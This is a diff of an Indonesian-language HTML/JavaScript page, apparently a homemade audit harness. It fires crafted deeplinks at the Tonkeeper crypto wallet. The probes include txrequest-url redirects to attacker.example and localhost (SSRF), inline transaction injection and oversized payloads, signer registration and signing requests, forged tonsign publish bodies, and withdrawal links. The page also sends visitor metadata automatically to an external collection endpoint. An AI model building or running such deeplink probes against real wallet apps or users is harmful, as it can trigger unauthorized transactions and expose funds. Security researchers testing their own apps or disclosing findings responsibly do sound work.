@@ -3,16 +3,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Tonkeeper Deeplink Deep Audit</title>
+<title>Tonkeeper Deeplink Audit v2</title>
 <style>
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   body { font-family: -apple-system, sans-serif; max-width: 600px; margin: 0 auto; padding: 12px; background: #0a0e14; color: #c9d1d9; font-size: 14px; line-height: 1.5; }
   h1 { color: #58a6ff; font-size: 16px; margin: 0 0 4px; }
   .sub { color: #8b949e; font-size: 11px; margin-bottom: 12px; }
   .card { background: #111721; border: 1px solid #21262d; border-radius: 10px; padding: 12px; margin-bottom: 10px; }
-  .card h2 { color: #d29922; font-size: 12px; margin: 0 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .card h2 { color: #d29922; font-size: 12px; margin: 0 0 6px; text-transform: uppercase; }
   .hyp { color: #8b949e; font-size: 11px; margin: 0 0 10px; font-style: italic; }
   input, textarea { width: 100%; padding: 8px; background: #0a0e14; border: 1px solid #21262d; border-radius: 6px; color: #79c0ff; font-family: ui-monospace, monospace; font-size: 11px; margin: 4px 0 8px; box-sizing: border-box; }
+  textarea { min-height: 60px; resize: vertical; }
   .btn { display: block; width: 100%; padding: 11px; border: none; border-radius: 8px; color: #fff; font-size: 13px; font-weight: 600; cursor: pointer; margin-bottom: 6px; text-align: left; padding-left: 12px; }
   .btn:active { opacity: 0.75; }
   .btn small { display: block; font-weight: 400; opacity: 0.7; font-size: 10px; margin-top: 2px; }
@@ -20,132 +21,136 @@
   .b3 { background: #9e6a03; } .b4 { background: #da3633; }
   .b5 { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; }
   .b6 { background: #6f42c1; }
-  #log { background: #0a0e14; border: 1px solid #21262d; border-radius: 6px; padding: 8px; max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 10px; }
+  .b7 { background: #0d6efd; }
+  #log { background: #0a0e14; border: 1px solid #21262d; border-radius: 6px; padding: 8px; max-height: 180px; overflow-y: auto; font-family: monospace; font-size: 10px; }
   .le { padding: 2px 0; border-bottom: 1px solid #161b22; }
   .le.s { color: #3fb950; } .le.e { color: #f85149; }
   .le.w { color: #d29922; } .le.i { color: #58a6ff; }
-  .obs { margin-top: 8px; }
-  .obs input { margin-bottom: 4px; }
-  .badge { display: inline-block; padding: 1px 6px; border-radius: 8px; background: #21262d; color: #8b949e; font-size: 10px; }
+  .preview { background: #0a0e14; border: 1px solid #21262d; border-radius: 6px; padding: 8px; font-family: monospace; font-size: 10px; word-break: break-all; color: #79c0ff; max-height: 100px; overflow-y: auto; }
+  .row { display: flex; gap: 6px; }
+  .row .btn { flex: 1; }
 </style>
 </head>
 <body>
 
-<h1>🔬 Tonkeeper Deeplink Deep Audit</h1>
-<p class="sub">6 vektor deeplink · hasil auto-kirim</p>
+<h1>🔬 Tonkeeper Deeplink Audit v2</h1>
+<p class="sub">base64url · format diperbaiki · hasil auto-kirim</p>
 
 <div class="card">
   <h2>⚙️ Config</h2>
   <input type="text" id="endpoint" value="https://ckytrx0m.instances.httpworkbench.com/">
-  <input type="text" id="attacker_url" value="https://attacker.example/txrequest.json" placeholder="URL untuk txrequest-url">
   <input type="text" id="pk" value="deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef">
+  <input type="text" id="txurl" value="attacker.example/txrequest.json" placeholder="domain/path (tanpa https://)">
 </div>
 
 <div class="card">
-  <h2>1️⃣ /v1/txrequest-url — SSRF + Tx Injection</h2>
-  <p class="hyp">Hipotesis: wallet fetch URL eksternal tanpa validasi. Coba arahkan ke server attacker.</p>
-  <button class="btn b1" onclick="t('txreq_url_attacker','https://app.tonkeeper.com/v1/txrequest-url/'+au())">
-    txrequest-url → attacker<small>https://app.tonkeeper.com/v1/txrequest-url/attacker.example/...</small>
+  <h2>1️⃣ txrequest-inline (base64url)</h2>
+  <p class="hyp">Fix: pakai base64url (bukan btoa). Format: <code>https://app.tonkeeper.com/v1/txrequest-inline/&lt;base64url&gt;</code></p>
+  <button class="btn b6" onclick="tInline('basic')">
+    txrequest-inline · Basic Transfer<small>Transfer 0.001 TON ke address dummy</small>
   </button>
-  <button class="btn b3" onclick="t('txreq_url_localhost','https://app.tonkeeper.com/v1/txrequest-url/127.0.0.1:8080/tx.json')">
-    txrequest-url → localhost<small>Cek SSRF internal network</small>
+  <button class="btn b6" onclick="tInline('invalid')">
+    txrequest-inline · Invalid JSON<small>Cek error handling</small>
   </button>
-  <button class="btn b3" onclick="t('txreq_url_http','https://app.tonkeeper.com/v1/txrequest-url/http://attacker.example/tx.json')">
-    txrequest-url → http://<small>Cek validasi scheme</small>
+  <button class="btn b6" onclick="tInline('oversized')">
+    txrequest-inline · Oversized<small>Cek DoS / buffer</small>
   </button>
+  <div class="preview" id="prev-inline">-</div>
 </div>
 
 <div class="card">
-  <h2>2️⃣ /v1/txrequest-inline — Arbitrary Tx Injection</h2>
-  <p class="hyp">Hipotesis: transaction data di-parse tanpa validasi. Inject transaksi arbitrary.</p>
-  <button class="btn b6" onclick="t('txreq_inline_basic','https://app.tonkeeper.com/v1/txrequest-inline/'+btoa(JSON.stringify({valid_until:Math.floor(Date.now()/1000)+360,messages:[{address:'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKq2',amount:'1000000'}]})))">
-    txrequest-inline (basic tx)<small>Inject transaksi langsung via base64</small>
+  <h2>2️⃣ txrequest-url (format diperbaiki)</h2>
+  <p class="hyp">Fix: tanpa <code>https://</code> di dalam path. Format: <code>https://app.tonkeeper.com/v1/txrequest-url/&lt;domain/path&gt;</code></p>
+  <button class="btn b1" onclick="tUrl('normal')">
+    txrequest-url · Attacker Domain<small>https://app.tonkeeper.com/v1/txrequest-url/attacker.example/tx.json</small>
   </button>
-  <button class="btn b6" onclick="t('txreq_inline_invalid','https://app.tonkeeper.com/v1/txrequest-inline/'+btoa('invalid-json'))">
-    txrequest-inline (invalid JSON)<small>Cek error handling</small>
+  <button class="btn b3" onclick="tUrl('localhost')">
+    txrequest-url · Localhost<small>Cek SSRF internal network</small>
   </button>
-  <button class="btn b6" onclick="t('txreq_inline_oversized','https://app.tonkeeper.com/v1/txrequest-inline/'+btoa('A'.repeat(10000)))">
-    txrequest-inline (oversized)<small>Cek DoS / buffer</small>
+  <button class="btn b3" onclick="tUrl('http')">
+    txrequest-url · HTTP Scheme<small>Cek validasi scheme</small>
   </button>
+  <div class="preview" id="prev-url">-</div>
 </div>
 
 <div class="card">
-  <h2>3️⃣ /publish — Arbitrary Signature Publish</h2>
-  <p class="hyp">Hipotesis: signature dari deeplink dipublish tanpa verifikasi kriptografis terhadap transaksi asli.</p>
-  <button class="btn b4" onclick="t('publish_random_sig','tonkeeper://publish?sign='+Array.from({length:128},()=>Math.floor(Math.random()*16).toString(16)).join(''))">
-    publish (random signature)<small>tonkeeper://publish?sign=&lt;128 hex&gt;</small>
+  <h2>3️⃣ Signer Register</h2>
+  <p class="hyp">Format: <code>tonkeeper://signer/link?pk=&lt;hex&gt;&name=&lt;name&gt;</code></p>
+  <button class="btn b2" onclick="tSigner('register')">
+    Register Signer<small>Buat signer baru dengan pk dummy</small>
   </button>
-  <button class="btn b4" onclick="t('publish_zero_sig','tonkeeper://publish?sign='+'0'.repeat(128))">
-    publish (zero signature)<small>Cek validasi signature</small>
+  <button class="btn b4" onclick="tSigner('sign')">
+    Sign Request<small>Cek apakah sign butuh PIN</small>
   </button>
-  <button class="btn b3" onclick="t('publish_empty','tonkeeper://publish?sign=')">
-    publish (empty sign)
-  </button>
+  <div class="preview" id="prev-signer">-</div>
 </div>
 
 <div class="card">
-  <h2>4️⃣ /action?eventId= — Event Injection</h2>
-  <p class="hyp">Hipotesis: eventId tidak divalidasi terhadap backend. Bisa tampilkan transaksi arbitrary.</p>
-  <button class="btn b3" onclick="t('action_random','tonkeeper://action?eventId='+Math.random().toString(36).slice(2))">
-    action (random eventId)
+  <h2>4️⃣ Signer Publish (tonsign://)</h2>
+  <p class="hyp">Fix: format <code>tonsign://v1?pk=&body=&return=&v=1&network=ton</code> (dari dokumentasi Signer)</p>
+  <button class="btn b4" onclick="tPublish('random')">
+    Publish · Random Body<small>Cek verifikasi signature</small>
   </button>
-  <button class="btn b3" onclick="t('action_hash','tonkeeper://action?eventId='+'a'.repeat(64))">
-    action (64-hex hash)
+  <button class="btn b4" onclick="tPublish('zero')">
+    Publish · Zero Body<small>Cek validasi</small>
   </button>
-  <button class="btn b3" onclick="t('action_sql','tonkeeper://action?eventId='+encodeURIComponent("1' OR '1'='1"))">
-    action (injection string)
-  </button>
+  <div class="preview" id="prev-publish">-</div>
 </div>
 
 <div class="card">
-  <h2>5️⃣ /confirm-withdrawal — Unauthorized Withdrawal</h2>
-  <p class="hyp">Hipotesis: deeplink langsung konfirmasi withdrawal tanpa validasi address.</p>
-  <button class="btn b4" onclick="t('confirm_wd_random','tonkeeper://confirm-withdrawal/EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKq2')">
-    confirm-withdrawal (random addr)
+  <h2>5️⃣ Action & Lainnya</h2>
+  <button class="btn b3" onclick="tSimple('action','tonkeeper://action?eventId=' + Math.random().toString(36).slice(2))">
+    /action · Random eventId
   </button>
-  <button class="btn b4" onclick="t('confirm_wd_empty','tonkeeper://confirm-withdrawal/')">
-    confirm-withdrawal (empty addr)
+  <button class="btn b3" onclick="tSimple('subscribe','tonkeeper://subscribe/' + Math.random().toString(36).slice(2))">
+    /subscribe · Random invoiceId
   </button>
-</div>
-
-<div class="card">
-  <h2>6️⃣ /subscribe — Invoice Injection</h2>
-  <p class="hyp">Hipotesis: invoiceId arbitrary bisa buat subscription malicious.</p>
-  <button class="btn b6" onclick="t('subscribe_random','tonkeeper://subscribe/'+Math.random().toString(36).slice(2))">
-    subscribe (random invoiceId)
-  </button>
-  <button class="btn b6" onclick="t('subscribe_negative','tonkeeper://subscribe/-1')">
-    subscribe (negative ID)
+  <button class="btn b3" onclick="tSimple('confirm-wd','tonkeeper://confirm-withdrawal/EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKq2')">
+    /confirm-withdrawal · Dummy address
   </button>
 </div>
 
 <div class="card">
-  <h2>📝 Log Observasi</h2>
-  <p class="hyp">Untuk setiap test, isi: apa yang muncul di Tonkeeper.</p>
-  <input type="text" id="obs" placeholder="contoh: muncul konfirmasi, error, atau tidak terjadi apa-apa">
+  <h2>📋 Copy Link (untuk test manual)</h2>
+  <p class="hyp">Kalau iframe/redirect gagal, copy link lalu paste di address bar Chrome.</p>
+  <textarea id="copybox" readonly placeholder="Pilih test dulu..."></textarea>
+  <button class="btn b5" onclick="copyLink()">📋 Copy ke Clipboard</button>
+</div>
+
+<div class="card">
+  <h2>📝 Observasi</h2>
+  <input type="text" id="obs" placeholder="Apa yang muncul di Tonkeeper?">
   <button class="btn b5" onclick="submitObs()">Kirim Observasi</button>
 </div>
 
 <div class="card">
-  <h2>📊 Log <span class="badge" id="count">0</span></h2>
+  <h2>📊 Log</h2>
   <div id="log"></div>
-  <button class="btn b5" style="margin-top:6px" onclick="clearLog()">Clear</button>
+  <button class="btn b5" style="margin-top:6px" onclick="document.getElementById('log').innerHTML=''">Clear</button>
 </div>
 
 <script>
-const S = { logs: [], last: null };
-function pk(){ return document.getElementById('pk').value.trim(); }
-function au(){ return document.getElementById('attacker_url').value.trim(); }
-function ep(){ return document.getElementById('endpoint').value.trim(); }
+const S = { last: null };
+
+// ============================================
+// BASE64URL ENCODER (PROPER)
+// ============================================
+function base64url(obj) {
+  const json = typeof obj === 'string' ? obj : JSON.stringify(obj);
+  const b64 = btoa(unescape(encodeURIComponent(json)));
+  return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+function pk() { return document.getElementById('pk').value.trim(); }
+function txurl() { return document.getElementById('txurl').value.trim(); }
+function ep() { return document.getElementById('endpoint').value.trim(); }
 
 function log(m, c='i') {
   const t = new Date().toLocaleTimeString();
-  S.logs.push({t,m,c});
   const el = document.createElement('div');
   el.className = 'le ' + c;
   el.textContent = `[${t}] ${m}`;
   document.getElementById('log').prepend(el);
-  document.getElementById('count').textContent = S.logs.length;
 }
 
 async function send(data) {
@@ -158,33 +163,125 @@ function meta(x) {
   return Object.assign({
     ua: navigator.userAgent,
     platform: /android/i.test(navigator.userAgent) ? 'android' : /iphone|ipad/i.test(navigator.userAgent) ? 'ios' : 'other',
-    isTMA: /Telegram/i.test(navigator.userAgent),
-    origin: location.origin,
     ts: new Date().toISOString()
   }, x || {});
 }
 
-function t(name, url) {
+// ============================================
+// TRIGGER DEEPLINK
+// ============================================
+function trigger(name, url) {
   S.last = name;
   log('▶ ' + name, 'w');
+  document.getElementById('copybox').value = url;
   send(meta({ test: name, url, event: 'trigger' }));
+
+  // Cara 1: iframe (paling reliable di mobile Chrome)
   const f = document.createElement('iframe');
   f.style.display = 'none';
   f.src = url;
   document.body.appendChild(f);
-  setTimeout(() => { location.href = url; }, 80);
+
+  // Cara 2: location.href (fallback)
+  setTimeout(() => { location.href = url; }, 100);
+}
+
+// ============================================
+// 1. TXREQUEST INLINE
+// ============================================
+function tInline(mode) {
+  let data;
+  if (mode === 'basic') {
+    data = {
+      valid_until: Math.floor(Date.now()/1000) + 360,
+      messages: [{
+        address: 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKq2',
+        amount: '1000000'
+      }]
+    };
+  } else if (mode === 'invalid') {
+    data = 'not-valid-json{{{';
+  } else {
+    data = 'A'.repeat(10000);
+  }
+
+  const encoded = base64url(data);
+  const url = `https://app.tonkeeper.com/v1/txrequest-inline/${encoded}`;
+  document.getElementById('prev-inline').textContent = url;
+  trigger('inline_' + mode, url);
+}
+
+// ============================================
+// 2. TXREQUEST URL
+// ============================================
+function tUrl(mode) {
+  let inner;
+  if (mode === 'normal') inner = txurl();
+  else if (mode === 'localhost') inner = '127.0.0.1:8080/tx.json';
+  else inner = 'http://attacker.example/tx.json';
+
+  const url = `https://app.tonkeeper.com/v1/txrequest-url/${inner}`;
+  document.getElementById('prev-url').textContent = url;
+  trigger('url_' + mode, url);
+}
+
+// ============================================
+// 3. SIGNER
+// ============================================
+function tSigner(mode) {
+  const url = mode === 'register'
+    ? `tonkeeper://signer/link?pk=${pk()}&name=test-${Date.now()}`
+    : `tonkeeper://signer/sign?pk=${pk()}&body=${base64url('probe')}`;
+  document.getElementById('prev-signer').textContent = url;
+  trigger('signer_' + mode, url);
+}
+
+// ============================================
+// 4. PUBLISH (tonsign:// format)
+// ============================================
+function tPublish(mode) {
+  const body = mode === 'random'
+    ? Array.from({length:64},()=>Math.floor(Math.random()*16).toString(16)).join('')
+    : '0'.repeat(64);
+
+  const url = `tonsign://v1?pk=${pk()}&body=${body}&return=tonkeeper://&v=1&network=ton`;
+  document.getElementById('prev-publish').textContent = url;
+  trigger('publish_' + mode, url);
+}
+
+// ============================================
+// 5. SIMPLE
+// ============================================
+function tSimple(name, url) {
+  trigger(name, url);
+}
+
+// ============================================
+// COPY & OBSERVE
+// ============================================
+function copyLink() {
+  const box = document.getElementById('copybox');
+  box.select();
+  box.setSelectionRange(0, 99999);
+  try {
+    document.execCommand('copy');
+    log('📋 Copied: ' + box.value.slice(0, 60) + '...', 's');
+  } catch(e) {
+    log('❌ Copy gagal: ' + e.message, 'e');
+  }
 }
 
 async function submitObs() {
   const o = document.getElementById('obs').value.trim();
   if (!o) return;
   await send(meta({ test: 'observation', for: S.last, observation: o }));
-  log('📝 ' + o.slice(0, 50), 's');
+  log('📝 obs: ' + o.slice(0, 50), 's');
   document.getElementById('obs').value = '';
 }
 
-function clearLog() { S.logs = []; document.getElementById('log').innerHTML = ''; document.getElementById('count').textContent = '0'; }
-
+// ============================================
+// INIT
+// ============================================
 document.addEventListener('visibilitychange', () => {
   send(meta({ test: 'visibility', hidden: document.hidden }));
   log(document.hidden ? '👋 hidden' : '👁 visible', document.hidden ? 's' : 'i');
@@ -192,7 +289,11 @@ document.addEventListener('visibilitychange', () => {
 
 window.addEventListener('DOMContentLoaded', () => {
   send(meta({ test: 'session_start' }));
-  log('ready', 's');
+  log('ready · base64url helper loaded', 's');
+
+  // Test base64url correctness
+  const test = base64url({hello: 'world'});
+  log('base64url test: ' + test + ' (len=' + test.length + ')', 'i');
 });
 </script>
 
